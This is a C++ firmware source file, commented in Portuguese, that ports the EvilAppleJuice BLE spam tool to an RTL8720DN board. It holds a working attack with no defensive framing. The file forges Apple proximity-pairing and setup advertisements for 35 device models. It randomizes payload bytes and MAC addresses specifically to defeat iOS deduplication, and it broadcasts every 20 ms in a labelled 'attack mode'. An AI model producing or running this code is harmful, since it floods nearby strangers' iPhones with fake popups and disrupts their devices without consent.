// =========================================================
// BLE Spam – Port of EvilAppleJuice-ESP32 para RTL8720DN BW16
// Original: github.com/EvilAppleJuice-ESP32
//
// Adaptações para Ameba SDK (BLEDevice.h v3.1.9):
//  - Objeto global é BLE (extern BLEDevice BLE), não BLEDevice::xxx
//  - BLEAdvert::setAdvData(uint8_t*, uint8_t) aceita buffer raw
//  - Sem setDeviceAddress() público → MAC fixo do chip (SDK limitação)
//  - ADV type randômico: ADV_IND / ADV_SCAN_IND / ADV_NONCONN_IND
// =========================================================

// STL primeiro para evitar conflito com macros do Ameba
#undef max
#include <vector>

#include "ble_spam.h"
#include "debug.h"

extern "C" {
#include "gap.h"
#include "gap_adv.h"
#include "gap_le.h"
#include "gap_le_types.h"
}

// =========================================================
// Tabela de dispositivos Apple (port direto de devices.hpp)
// =========================================================
const AppleDevice ALL_APPLE_DEVICES[] = {
  // ---- Audio (APPLE_AUDIO): payload 31 bytes, modelId no byte 7 ----
  {"Airpods",                0x02, APPLE_AUDIO},
  {"Power Beats",            0x03, APPLE_AUDIO},
  {"Beats X",                0x05, APPLE_AUDIO},
  {"Beats Solo 3",           0x06, APPLE_AUDIO},
  {"Beats Studio 3",         0x09, APPLE_AUDIO},
  {"Airpods Max",            0x0a, APPLE_AUDIO},
  {"Power Beats Pro",        0x0b, APPLE_AUDIO},
  {"Beats Solo Pro",         0x0c, APPLE_AUDIO},
  {"Airpods Pro",            0x0e, APPLE_AUDIO},
  {"Airpods Gen 2",          0x0f, APPLE_AUDIO},
  {"Beats Flex",             0x10, APPLE_AUDIO},
  {"Beats Studio Buds",      0x11, APPLE_AUDIO},
  {"Beats Fit Pro",          0x12, APPLE_AUDIO},
  {"Airpods Gen 3",          0x13, APPLE_AUDIO},
  {"Airpods Pro Gen 2",      0x14, APPLE_AUDIO},
  {"Beats Studio Buds+",     0x16, APPLE_AUDIO},
  {"Beats Studio Pro",       0x17, APPLE_AUDIO},
  {"Airpods Pro G2 USB-C",   0x24, APPLE_AUDIO},
  {"Beats Solo 4",           0x25, APPLE_AUDIO},
  {"Beats Solo Buds",        0x26, APPLE_AUDIO},
  {"Software Update",        0x2e, APPLE_AUDIO},
  {"Powerbeats Fit",         0x2f, APPLE_AUDIO},
  // ---- Setup (APPLE_SETUP): payload 23 bytes, modelId no byte 13 ----
  {"AppleTV Setup",          0x01, APPLE_SETUP},
  {"Transfer Number",        0x02, APPLE_SETUP},
  {"AppleTV Pair",           0x06, APPLE_SETUP},
  {"Setup New Phone",        0x09, APPLE_SETUP},
  {"Homepod Setup",          0x0b, APPLE_SETUP},
  {"AppleTV Homekit",        0x0d, APPLE_SETUP},
  {"AppleTV Keyboard",       0x13, APPLE_SETUP},
  {"TV Color Balance",       0x1e, APPLE_SETUP},
  {"AppleTV New User",       0x20, APPLE_SETUP},
  {"Vision Pro",             0x24, APPLE_SETUP},
  {"AppleTV Conn Net",       0x27, APPLE_SETUP},
  {"AppleTV AppleID",        0x2b, APPLE_SETUP},
  {"AppleTV Audio Sync",     0xc0, APPLE_SETUP},
};

// =========================================================
// generateApplePacket – port de devices.cpp::generatePacket
//
// Retorna um buffer ADV record completo (já com length + type + OUI):
//  APPLE_AUDIO → 31 bytes: [0x1e][0xff][0x4c][0x00][0x07][0x19][0x07][modelId][body×11]
//  APPLE_SETUP → 23 bytes: [0x16][0xff][0x4c][0x00][prefix×9][modelId][suffix×9]
// =========================================================
static uint8_t generateApplePacket(const AppleDevice& dev, uint8_t* buf) {
  memset(buf, 0, 31);

  if (dev.type == APPLE_AUDIO) {
    // Full 31-byte EvilAppleJuice payload (ADV record completo)
    // Bytes [8..18] são o corpo — randomizar 3 deles simula MACs diferentes,
    // evitando que o iOS deduplique e ignore pacotes repetidos.
    buf[0]  = 0x1e;        // Length = 30 (resto do record)
    buf[1]  = 0xff;        // AD Type: Manufacturer Specific
    buf[2]  = 0x4c;        // Apple OUI [0]
    buf[3]  = 0x00;        // Apple OUI [1]
    buf[4]  = 0x07;        // Proximity Pairing subtype
    buf[5]  = 0x19;        // Length of subtype data
    buf[6]  = 0x07;        // Status flags
    buf[7]  = dev.modelId; // Model ID
    buf[8]  = 0x20;
    buf[9]  = (uint8_t)random(0xFF); // randomiza → novo "device" a cada pacote
    buf[10] = 0xaa;
    buf[11] = (uint8_t)random(0xFF); // randomiza
    buf[12] = 0x01;
    buf[13] = 0x00;
    buf[14] = 0x00;
    buf[15] = (uint8_t)random(0xFF); // randomiza
    buf[16] = 0x12;
    buf[17] = 0x12;
    buf[18] = 0x12;
    // bytes 19..30 = 0x00 (já zerados pelo memset)
    return 31;
  } else {
    // APPLE_SETUP — 23 bytes (mantido igual, já funcionava)
    const uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
    const uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    memcpy(buf, prefix, 13);
    buf[13] = dev.modelId;
    memcpy(buf + 14, suffix, 9);
    return 23; // Total length: 1 AD len + 22 data bytes
  }
}

// =========================================================
// Runtime state
// =========================================================
bool     isBleSpamming = false;
uint32_t ble_pkt_sent  = 0;
uint8_t  ble_spam_idx  = 0;

static bool ble_initialized = false;

// =========================================================
// ble_spam_next – avança para o próximo dispositivo e transmite
// =========================================================
void ble_spam_next() {
  if (!ble_initialized) return;

  // Avança no ciclo de dispositivos Apple
  ble_spam_idx = (ble_spam_idx + 1) % (uint8_t)NUM_APPLE_DEVICES;
  const AppleDevice& dev = ALL_APPLE_DEVICES[ble_spam_idx];

  // Constrói o payload Apple (AD record raw)
  uint8_t packet[31];
  uint8_t pktLen = generateApplePacket(dev, packet);

  DEBUG_SER_PRINT("[BLE] TX: ");
  DEBUG_SER_PRINT(dev.name);
  DEBUG_SER_PRINT(" id=0x");
  DEBUG_SER_PRINT(dev.modelId, HEX);
  DEBUG_SER_PRINT(" len=");
  DEBUG_SER_PRINT((int)pktLen);
  DEBUG_SER_PRINT("\n");

  BLEAdvert* advert = BLE.configAdvert();

  // Pausa brevemente o advertising para aplicar novo Random MAC e payload
  advert->stopAdv();

  // Gera novo Random MAC a cada ciclo de dispositivo.
  // Essencial para o iOS não ignorar como duplicado/cacheado
  // e porque acessórios Apple genuínos usam Random Private Addresses.
  uint8_t rand_mac[6];
  for (int i = 0; i < 6; i++) {
    rand_mac[i] = (uint8_t)random(0xFF);
  }
  rand_mac[5] |= 0xC0; // Static Random Address (top 2 bits = 11)
  le_set_gap_param(GAP_PARAM_RANDOM_ADDR, 6, rand_mac);

  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_RANDOM;
  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);

  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  advert->setMinInterval(20); // 20ms intervalo de anúncio de alta densidade
  advert->setMaxInterval(20);
  advert->setAdvData(packet, pktLen);
  advert->updateAdvertParams();
  advert->startAdv();

  ble_pkt_sent++;
}

// =========================================================
// start_ble_spam
// =========================================================
void start_ble_spam() {
  if (ble_initialized) return;

  enable_rgb_attack_mode();
  DEBUG_SER_PRINT("[BLE] Iniciando EvilAppleJuice (35 dispositivos Apple)...\n");

  BLE.init();

  // Configura parâmetros base antes de beginPeripheral()
  BLEAdvert* advert = BLE.configAdvert();
  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  advert->setMinInterval(20); // 20ms
  advert->setMaxInterval(20);

  // Random MAC inicial
  uint8_t rand_mac[6];
  for (int i = 0; i < 6; i++) rand_mac[i] = (uint8_t)random(0xFF);
  rand_mac[5] |= 0xC0;
  le_set_gap_param(GAP_PARAM_RANDOM_ADDR, 6, rand_mac);
  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_RANDOM;
  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);

  BLE.beginPeripheral();

  ble_initialized = true;
  isBleSpamming   = true;
  ble_pkt_sent    = 0;
  ble_spam_idx    = (uint8_t)(NUM_APPLE_DEVICES - 1); // próximo next() começa do 0

  DEBUG_SER_PRINT("[BLE] Pronto. Iniciando broadcast...\n");
  ble_spam_next(); // primeiro pacote imediato
}

// =========================================================
// stop_ble_spam
// =========================================================
void stop_ble_spam() {
  isBleSpamming = false;
  disable_rgb_attack_mode();
  if (ble_initialized) {
    BLE.configAdvert()->stopAdv();
    BLE.end();
    ble_initialized = false;
    DEBUG_SER_PRINT("[BLE] BLE spam parado.\n");
  }
}